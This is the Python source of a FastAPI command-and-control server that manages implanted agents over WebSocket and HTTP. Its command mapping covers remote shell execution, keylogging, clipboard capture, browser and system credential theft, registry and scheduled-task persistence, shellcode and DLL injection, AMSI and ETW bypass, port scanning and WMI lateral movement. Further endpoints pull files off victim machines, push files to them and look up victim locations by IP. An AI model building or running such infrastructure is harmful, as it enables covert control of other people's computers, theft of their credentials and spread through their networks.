"""C2 Server Main Application"""

from fastapi import FastAPI, WebSocket, WebSocketDisconnect, status, Body, UploadFile, File, Form
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse, StreamingResponse
from contextlib import asynccontextmanager
import logging
import json
from datetime import datetime

from app.database import init_db, close_db
from app.api import auth, sessions, agents, commands, monitoring, files, credentials
from app.agent_manager import agent_manager

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

@asynccontextmanager
async def lifespan(app: FastAPI):
    """Application lifespan management"""
    # Startup
    logger.info("C2 Server starting...")
    try:
        await init_db()
        logger.info("Database initialized")
    except Exception as e:
        logger.error(f"Database initialization failed: {e}")
        logger.warning("Server will continue without database (live WebSocket agents still work)")
    yield
    # Shutdown
    logger.info("C2 Server shutting down...")
    try:
        await close_db()
        logger.info("Database connections closed")
    except Exception as e:
        logger.error(f"Shutdown error: {e}")

# Create FastAPI app
app = FastAPI(
    title="C2 Server API",
    description="Secure Remote Administration Framework",
    version="0.1.0",
    docs_url="/api/docs",
    openapi_url="/api/openapi.json",
    lifespan=lifespan
)

# CORS Configuration
origins = [
    "http://localhost:3000",
    "http://localhost:5173",
    "http://127.0.0.1:3000",
    "http://127.0.0.1:5173",
    "*",
]

app.add_middleware(
    CORSMiddleware,
    allow_origins=origins,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Include routers
app.include_router(auth.router, prefix="/api")
app.include_router(sessions.router, prefix="/api")
app.include_router(agents.router, prefix="/api")
app.include_router(commands.router, prefix="/api")
app.include_router(monitoring.router, prefix="/api")
app.include_router(files.router, prefix="/api")
app.include_router(credentials.router, prefix="/api")


# ============ Health & Status Endpoints ============

@app.get("/health")
async def health_check():
    """Health check endpoint"""
    return {
        "status": "healthy",
        "version": "0.1.0",
        "timestamp": datetime.utcnow().isoformat(),
        "live_agents": len(agent_manager.active_connections),
    }


@app.get("/")
async def root():
    """Root endpoint"""
    return {
        "message": "C2 Server is operational",
        "docs": "/api/docs",
        "api_version": "0.1.0",
        "live_agents": len(agent_manager.active_connections),
    }


@app.get("/api/status")
async def api_status():
    """API status endpoint"""
    return {
        "status": "operational",
        "version": "0.1.0",
        "timestamp": datetime.utcnow().isoformat(),
        "components": {
            "database": "connected",
            "auth": "operational",
            "sessions": "operational",
            "websocket": "operational",
        },
        "live_agents": len(agent_manager.active_connections),
    }


# ============ Command Format Conversion ============

def convert_to_rust_command(cmd: dict) -> dict:
    """Convert frontend command format to Rust CommandType enum format.
    Must match the serde rename attributes in agent/src/executor.rs CommandType.
    """
    cmd_type = cmd.get("command_type", "shell")
    mapping = {
        "shell": lambda: {"shell": {"command": cmd.get("command", "")}},
        "execute": lambda: {"execute": {"program": cmd.get("program", ""), "args": cmd.get("args", [])}},
        "whoami": lambda: "whoami",
        "pwd": lambda: "pwd",
        "list_dir": lambda: {"ls": {"path": cmd.get("path", ".")}},
        "read_file": lambda: {"cat": {"path": cmd.get("path", "")}},
        "write_file": lambda: {"write": {"path": cmd.get("path", ""), "content": cmd.get("content", "")}},
        "delete_file": lambda: {"delete": {"path": cmd.get("path", "")}},
        "mkdir": lambda: {"mkdir": {"path": cmd.get("path", "")}},
        "system_info": lambda: "systeminfo",
        "process_list": lambda: "ps",
        "kill_process": lambda: {"kill": {"pid": cmd.get("pid", 0)}},
        "network_info": lambda: "ifconfig",
        "screenshot": lambda: "screenshot",
        "echo": lambda: {"echo": {"message": cmd.get("message", "")}},
        "keylogger_start": lambda: "keylogger_start",
        "keylogger_stop": lambda: "keylogger_stop",
        "keylogger_logs": lambda: "keylogger_logs",
        "keylogger_clear": lambda: "keylogger_clear",
        "download_file": lambda: {"download": {"path": cmd.get("path", "")}},
        "upload_file": lambda: {"upload": {"path": cmd.get("path", ""), "data": cmd.get("data", "")}},
        "search_files": lambda: {"search_files": {"root": cmd.get("root", "."), "pattern": cmd.get("pattern", ""), "max_depth": cmd.get("max_depth", 5)}},
        "credentials_browser": lambda: "credentials_browser",
        "credentials_system": lambda: "credentials_system",
        "credentials_all": lambda: "credentials_all",
        "config_beacon": lambda: {"config_beacon": {"sleep_ms": cmd.get("sleep_ms", 10000), "jitter_pct": cmd.get("jitter_pct", 0.33)}},
        "clipboard_start": lambda: "clipboard_start",
        "clipboard_stop": lambda: "clipboard_stop",
        "clipboard_logs": lambda: "clipboard_logs",
        "persist_registry": lambda: "persist_registry",
        "persist_schtask": lambda: "persist_schtask",
        "persist_startup": lambda: "persist_startup",
        "persist_remove": lambda: "persist_remove",
        "inject_shellcode": lambda: {"inject_shellcode": {"pid": cmd.get("pid", 0), "shellcode_b64": cmd.get("shellcode_b64", "")}},
        "inject_dll": lambda: {"inject_dll": {"pid": cmd.get("pid", 0), "dll_path": cmd.get("dll_path", "")}},
        "amsi_bypass": lambda: "amsi_bypass",
        "etw_bypass": lambda: "etw_bypass",
        "discover_hosts": lambda: "discover_hosts",
        "port_scan": lambda: {"port_scan": {"target": cmd.get("target", ""), "ports": cmd.get("ports")}},
        "wmi_exec": lambda: {"wmi_exec": {"target": cmd.get("target", ""), "username": cmd.get("username", ""), "password": cmd.get("password", ""), "command": cmd.get("command", "")}},
        "privesc_check": lambda: "privesc_check",
    }
    if cmd_type in mapping:
        return mapping[cmd_type]()
    return {"shell": {"command": cmd.get("command", str(cmd))}}


# ============ WebSocket Endpoints ============

@app.websocket("/ws/agent/{agent_id}")
async def websocket_agent_endpoint(websocket: WebSocket, agent_id: str):
    """WebSocket endpoint for agent communication"""
    await agent_manager.connect(agent_id, websocket)

    # Capture client IP
    client_ip = "unknown"
    if websocket.client:
        client_ip = websocket.client.host
    agent_manager.update_agent_info(agent_id, {"ip_address": client_ip})
    logger.info(f"Agent {agent_id} connected via WebSocket from {client_ip}")

    try:
        while True:
            data = await websocket.receive_text()
            logger.info(f"Received from {agent_id}: {len(data)} bytes")

            # Try to parse as encrypted envelope
            try:
                envelope = json.loads(data)
                if "v" in envelope and "data" in envelope:
                    agent_manager.log_beacon(agent_id, envelope)
                    agent_manager.update_agent_info(agent_id, {
                        "last_envelope_version": envelope.get("v"),
                        "last_message_index": envelope.get("idx"),
                        "encryption": "active",
                    })
                    logger.info(
                        f"Agent {agent_id}: encrypted envelope v{envelope.get('v')}, "
                        f"idx={envelope.get('idx')}, data_size={len(envelope.get('data', ''))}"
                    )
                elif "msg_type" in envelope:
                    msg_type = envelope.get("msg_type", "unknown")
                    # Handle REGISTER message with system info
                    if msg_type == "REGISTER":
                        agent_manager.update_agent_info(agent_id, {
                            "hostname": envelope.get("hostname"),
                            "os": envelope.get("os"),
                            "os_version": envelope.get("os_version"),
                            "architecture": envelope.get("architecture"),
                            "user": envelope.get("user"),
                        })
                        logger.info(
                            f"Agent {agent_id} registered: "
                            f"{envelope.get('hostname')} | {envelope.get('os')} | "
                            f"{envelope.get('user')} | {client_ip}"
                        )
                        # GeoIP lookup in background
                        async def do_geoip(aid, ip):
                            from app.agent_manager import lookup_geoip
                            geo = await lookup_geoip(ip)
                            if geo:
                                agent_manager.update_agent_info(aid, {
                                    "country": geo.get("country", ""),
                                    "city": geo.get("city", ""),
                                    "isp": geo.get("isp", ""),
                                })
                        import asyncio
                        asyncio.create_task(do_geoip(agent_id, client_ip))
                        # Send ACK and continue
                        ack = {"type": "ack", "status": "registered", "timestamp": datetime.utcnow().isoformat()}
                        await websocket.send_text(json.dumps(ack))
                        continue
                    elif msg_type == "RESPONSE":
                        cmd_id = envelope.get("cmd_id", 0)
                        status = envelope.get("status", "completed")
                        output = envelope.get("output", "")
                        error_msg = envelope.get("error", "")
                        agent_manager.store_command_result(agent_id, cmd_id, status, output, error_msg)
                        logger.info(f"Agent {agent_id}: command result (id={cmd_id}, status={status}, output_len={len(output)})")
                        continue
                    # Plaintext message (debug mode)
                    msg_type = envelope.get("msg_type", "unknown")
                    agent_manager.update_agent_info(agent_id, {
                        "encryption": "none (debug)",
                        "last_msg_type": msg_type,
                    })
                    if msg_type == "BEACON" and "payload" in envelope:
                        try:
                            beacon = json.loads(envelope["payload"])
                            agent_manager.update_agent_info(agent_id, {
                                "hostname": beacon.get("hostname"),
                                "os": beacon.get("os"),
                                "os_version": beacon.get("os_version"),
                                "architecture": beacon.get("architecture"),
                                "user": beacon.get("user"),
                                "ip_address": beacon.get("ip_address"),
                            })
                        except (json.JSONDecodeError, TypeError):
                            pass
                    logger.info(f"Agent {agent_id}: plaintext {msg_type}")
                else:
                    logger.warning(f"Agent {agent_id}: unknown message format")
            except json.JSONDecodeError:
                logger.warning(f"Agent {agent_id}: non-JSON data ({len(data)} bytes)")

            # Check for pending commands
            pending = agent_manager.get_pending_commands(agent_id)
            if pending:
                for entry in pending:
                    cmd = entry["command"]
                    cmd_id = entry.get("cmd_id", 0)
                    rust_cmd = convert_to_rust_command(cmd)
                    response = {
                        "type": "command",
                        "timestamp": datetime.utcnow().isoformat(),
                        "cmd_id": cmd_id,
                        "data": rust_cmd,
                    }
                    entry["status"] = "sent"
                    await websocket.send_text(json.dumps(response))
                    logger.info(f"Sent command to {agent_id} (id={cmd_id}): {json.dumps(rust_cmd)[:100]}")
            else:
                ack = {
                    "type": "ack",
                    "status": "ok",
                    "timestamp": datetime.utcnow().isoformat(),
                }
                await websocket.send_text(json.dumps(ack))

    except WebSocketDisconnect:
        logger.info(f"Agent {agent_id} disconnected (clean)")
    except Exception as e:
        logger.error(f"WebSocket error for {agent_id}: {e}")
    finally:
        agent_manager.disconnect(agent_id)


@app.websocket("/ws/monitoring")
async def websocket_monitoring_endpoint(websocket: WebSocket):
    """WebSocket endpoint for real-time monitoring"""
    await websocket.accept()
    logger.info("Monitoring client connected")

    try:
        while True:
            data = await websocket.receive_text()
            logger.debug(f"Monitoring request: {data[:100]}...")

            await websocket.send_json({
                "type": "status",
                "timestamp": datetime.utcnow().isoformat(),
                "live_agents": agent_manager.get_active_agents(),
            })
    except WebSocketDisconnect:
        logger.info("Monitoring client disconnected (clean)")
    except Exception as e:
        logger.error(f"Monitoring WebSocket error: {e}")
    finally:
        logger.info("Monitoring client disconnected")


# ============ Live Agent API (no auth, for testing) ============

@app.get("/api/live/agents")
async def get_live_agents():
    """Get currently connected agents via WebSocket"""
    return {
        "total": len(agent_manager.active_connections),
        "agents": agent_manager.get_active_agents(),
    }


@app.get("/api/live/agents/{agent_id}")
async def get_live_agent(agent_id: str):
    """Get details for a specific connected agent"""
    if not agent_manager.is_connected(agent_id):
        return JSONResponse(
            status_code=404,
            content={"detail": f"Agent {agent_id} is not connected"}
        )
    info = agent_manager.agent_info.get(agent_id, {})
    info["agent_id"] = agent_id
    info["pending_commands"] = len(agent_manager.command_queues.get(agent_id, []))
    info["total_beacons"] = len(agent_manager.beacon_log.get(agent_id, []))
    info["recent_beacons"] = agent_manager.beacon_log.get(agent_id, [])[-5:]
    return info


@app.post("/api/live/agents/{agent_id}/command")
async def send_command_to_agent(agent_id: str, command: dict = Body(...)):
    """Queue a command for a connected agent.

    Example body:
        {"command_type": "shell", "command": "whoami"}
        {"command_type": "execute", "program": "ls", "args": ["-la"]}
    """
    if not agent_manager.is_connected(agent_id):
        return JSONResponse(
            status_code=404,
            content={"detail": f"Agent {agent_id} is not connected"}
        )

    cmd_id = agent_manager.queue_command(agent_id, command)
    return {
        "status": "queued",
        "agent_id": agent_id,
        "cmd_id": cmd_id,
        "command": command,
        "queue_size": len(agent_manager.command_queues.get(agent_id, [])),
    }


@app.get("/api/live/agents/{agent_id}/commands/{cmd_id}")
async def get_command_result(agent_id: str, cmd_id: int):
    """Get a specific command result by cmd_id"""
    for entry in agent_manager.get_command_history(agent_id):
        if entry.get("cmd_id") == cmd_id:
            return entry
    return JSONResponse(status_code=404, content={"detail": "Command not found"})


@app.get("/api/live/agents/{agent_id}/beacons")
async def get_agent_beacons(agent_id: str):
    """Get beacon history for an agent"""
    beacons = agent_manager.beacon_log.get(agent_id, [])
    return {
        "agent_id": agent_id,
        "total": len(beacons),
        "beacons": beacons[-50:],
    }


@app.get("/api/live/agents/{agent_id}/commands")
async def get_agent_commands(agent_id: str):
    """Get command history for an agent"""
    return {
        "agent_id": agent_id,
        "commands": agent_manager.get_command_history(agent_id),
    }


# ============ File Transfer Endpoints ============

@app.get("/api/live/agents/{agent_id}/download/{cmd_id}")
async def download_file_result(agent_id: str, cmd_id: int):
    """Download a file from a completed download command result"""
    import base64
    import io

    for entry in agent_manager.get_command_history(agent_id):
        if entry.get("cmd_id") == cmd_id:
            if entry.get("status") != "success":
                return JSONResponse(status_code=400, content={"detail": "Command failed"})
            try:
                output = json.loads(entry.get("output", "{}"))
                file_data = base64.b64decode(output.get("data", ""))
                filename = output.get("filename", "download")
                return StreamingResponse(
                    io.BytesIO(file_data),
                    media_type="application/octet-stream",
                    headers={"Content-Disposition": f'attachment; filename="{filename}"'}
                )
            except Exception as e:
                return JSONResponse(status_code=500, content={"detail": str(e)})
    return JSONResponse(status_code=404, content={"detail": "Command not found"})


@app.post("/api/live/agents/{agent_id}/upload")
async def upload_file_to_agent(agent_id: str, file: UploadFile = File(...), dest_path: str = Form(...)):
    """Upload a file to an agent by queuing an upload command"""
    import base64

    if not agent_manager.is_connected(agent_id):
        return JSONResponse(status_code=404, content={"detail": f"Agent {agent_id} is not connected"})

    file_data = await file.read()
    max_size = 10 * 1024 * 1024  # 10MB
    if len(file_data) > max_size:
        return JSONResponse(status_code=413, content={"detail": f"File too large ({len(file_data)} bytes, max {max_size})"})

    b64_data = base64.b64encode(file_data).decode("utf-8")

    cmd = {"command_type": "upload_file", "path": dest_path, "data": b64_data}
    cmd_id = agent_manager.queue_command(agent_id, cmd)

    return {
        "status": "queued",
        "cmd_id": cmd_id,
        "filename": file.filename,
        "size": len(file_data),
        "dest_path": dest_path,
    }


# ============ HTTP Fallback Channel ============

http_agents: set = set()  # Track agents connected via HTTP

@app.post("/api/http/register")
async def http_register(data: dict = Body(...)):
    """HTTP fallback registration endpoint"""
    agent_id = data.get("agent_id", "")
    if not agent_id:
        return JSONResponse(status_code=400, content={"error": "No agent_id"})
    http_agents.add(agent_id)
    agent_manager.update_agent_info(agent_id, {
        "hostname": data.get("hostname", "Unknown"),
        "os": data.get("os", "Unknown"),
        "os_version": data.get("os_version", ""),
        "architecture": data.get("architecture", ""),
        "user": data.get("user", ""),
        "status": "active",
        "channel": "http",
    })
    if agent_id not in agent_manager.command_queues:
        agent_manager.command_queues[agent_id] = []
    if agent_id not in agent_manager.command_history:
        agent_manager.command_history[agent_id] = []
    if agent_id not in agent_manager.beacon_log:
        agent_manager.beacon_log[agent_id] = []
    logger.info(f"HTTP agent registered: {agent_id}")
    return {"status": "ok"}

@app.get("/api/http/tasks/{agent_id}")
async def http_get_tasks(agent_id: str):
    """Poll for pending tasks via HTTP"""
    if agent_id in agent_manager.agent_info:
        agent_manager.agent_info[agent_id]["last_seen"] = datetime.utcnow().isoformat()
    pending = agent_manager.get_pending_commands(agent_id)
    tasks = []
    for entry in pending:
        rust_cmd = convert_to_rust_command(entry.get("command", {}))
        tasks.append({"id": entry["cmd_id"], "command": rust_cmd})
    return {"tasks": tasks, "sleep": 10000}

@app.post("/api/http/result")
async def http_post_result(data: dict = Body(...)):
    """Receive command result via HTTP"""
    agent_id = data.get("agent_id", "")
    cmd_id = data.get("cmd_id", 0)
    if agent_id in agent_manager.agent_info:
        agent_manager.agent_info[agent_id]["last_seen"] = datetime.utcnow().isoformat()
    agent_manager.store_command_result(
        agent_id, int(cmd_id),
        data.get("status", "success"),
        data.get("output", ""),
        data.get("error"),
    )
    return {"status": "ok"}

# Patch get_live_agents to include HTTP agents
_original_get_live_agents = get_live_agents
@app.get("/api/live/agents", name="get_live_agents_v2")
async def get_live_agents_with_http():
    """Get currently connected agents (WebSocket + HTTP)"""
    result = agent_manager.get_active_agents()
    for aid in http_agents:
        if aid not in result:
            info = agent_manager.agent_info.get(aid, {}).copy()
            info["pending_commands"] = len(agent_manager.command_queues.get(aid, []))
            info["total_beacons"] = len(agent_manager.beacon_log.get(aid, []))
            result[aid] = info
    return result

# Patch command endpoint to also accept HTTP agents
@app.post("/api/live/agents/{agent_id}/command", name="send_command_v2")
async def send_command_to_agent_v2(agent_id: str, command: dict = Body(...)):
    """Queue a command for a connected agent (WebSocket or HTTP)"""
    is_ws = agent_manager.is_connected(agent_id)
    is_http = agent_id in http_agents
    if not is_ws and not is_http:
        return JSONResponse(
            status_code=404,
            content={"detail": f"Agent {agent_id} is not connected"}
        )
    cmd_id = agent_manager.queue_command(agent_id, command)
    return {
        "status": "queued",
        "agent_id": agent_id,
        "cmd_id": cmd_id,
        "command": command,
        "channel": "websocket" if is_ws else "http",
        "queue_size": len(agent_manager.command_queues.get(agent_id, [])),
    }


# ============ Error Handlers ============

@app.exception_handler(Exception)
async def global_exception_handler(request, exc):
    """Global exception handler"""
    logger.error(f"Unhandled exception: {exc}")
    return JSONResponse(
        status_code=500,
        content={"detail": "Internal server error"}
    )


if __name__ == "__main__":
    import uvicorn
    uvicorn.run(
        app,
        host="0.0.0.0",
        port=8000,
        reload=True,
        log_level="info"
    )
